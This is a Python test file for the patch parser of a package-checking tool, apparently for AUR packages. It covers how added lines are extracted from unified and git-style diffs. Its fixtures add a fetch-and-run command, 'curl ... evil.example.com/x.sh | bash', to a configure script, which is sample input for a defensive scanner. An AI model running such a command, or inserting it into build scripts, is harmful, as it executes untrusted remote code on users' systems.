from __future__ import annotations

from aurmanager.parser.patch import extract_added_lines, parse_patch


_UNIFIED_DIFF = """\
--- a/configure	2026-08-18 23:24:30.789718951 +0300
+++ b/configure	2026-08-18 23:24:30.795107548 +0300
@@ -1,4 +1,5 @@
 #!/bin/sh
 echo "configuring..."
+curl -fsSL https://evil.example.com/x.sh | bash
 make_flags="-O2"
 echo "done"
"""

_GIT_STYLE_DIFF = """\
diff --git a/configure b/configure
index 5286670..d662abf 100644
--- a/configure
+++ b/configure
@@ -1,4 +1,5 @@
 #!/bin/sh
 echo "configuring..."
+curl -fsSL https://evil.example.com/x.sh | bash
 make_flags="-O2"
 echo "done"
"""


def test_extract_added_lines_keeps_only_plus_prefixed_content():
    result = extract_added_lines(_UNIFIED_DIFF)
    lines = result.split("\n")
    assert lines[5] == "curl -fsSL https://evil.example.com/x.sh | bash"
    # Every other line (headers, hunk marker, context) is blanked, not removed.
    assert lines[0] == lines[1] == lines[2] == lines[3] == lines[4] == ""
    assert lines[6] == lines[7] == ""


def test_extract_added_lines_preserves_line_count_and_therefore_line_numbers():
    original_line_count = len(_UNIFIED_DIFF.splitlines())
    result = extract_added_lines(_UNIFIED_DIFF)
    assert len(result.split("\n")) == original_line_count


def test_extract_added_lines_handles_git_style_diff_preamble():
    result = extract_added_lines(_GIT_STYLE_DIFF)
    lines = result.split("\n")
    # diff --git / index preamble lines are blanked like any other non-added line.
    assert lines[0] == lines[1] == ""
    assert "curl -fsSL https://evil.example.com/x.sh | bash" in result


def test_extract_added_lines_does_not_treat_plusplusplus_header_as_added_content():
    result = extract_added_lines(_UNIFIED_DIFF)
    assert "b/configure" not in result


def test_extract_added_lines_preserves_added_content_starting_with_plus():
    # Regression: a genuinely added line whose content itself starts with '+'
    # (e.g. C's `++counter;`) produces the raw diff line '+++counter;' (the
    # '+' added-line marker followed by content starting with '+'). A naive
    # `startswith("+++")` check misreads this as the `+++ b/file` header and
    # drops it -- '+++' only means "file header" outside a hunk; inside one,
    # a leading '+' always means "added line" regardless of what follows.
    diff = """--- a/counter.c
+++ b/counter.c
@@ -1,3 +1,4 @@
 int main() {
   int counter = 0;
++counter;
   return 0;
"""
    result = extract_added_lines(diff)
    assert "+counter;" in result.split("\n")
    assert "b/counter.c" not in result


def test_extract_added_lines_resets_hunk_state_per_file_in_multi_file_patch():
    # Regression: hunk state must reset at each file's own `--- a/file`
    # header, or a second file's `+++ b/file2` header (encountered while
    # still "in a hunk" from the first file) gets misread as added content.
    diff = """--- a/f1
+++ b/f1
@@ -1,1 +1,2 @@
 x
+first
--- a/f2
+++ b/f2
@@ -1,1 +1,2 @@
 y
+second
"""
    result = extract_added_lines(diff)
    added = [l for l in result.split("\n") if l]
    assert added == ["first", "second"]


def test_parse_patch_sets_is_patch_and_empty_ast(tmp_path):
    path = tmp_path / "fix.patch"
    path.write_text(_UNIFIED_DIFF)
    ctx = parse_patch(path)
    assert ctx.is_patch is True
    assert ctx.ast == []
    assert ctx.file == path
    assert "curl -fsSL https://evil.example.com/x.sh | bash" in ctx.source
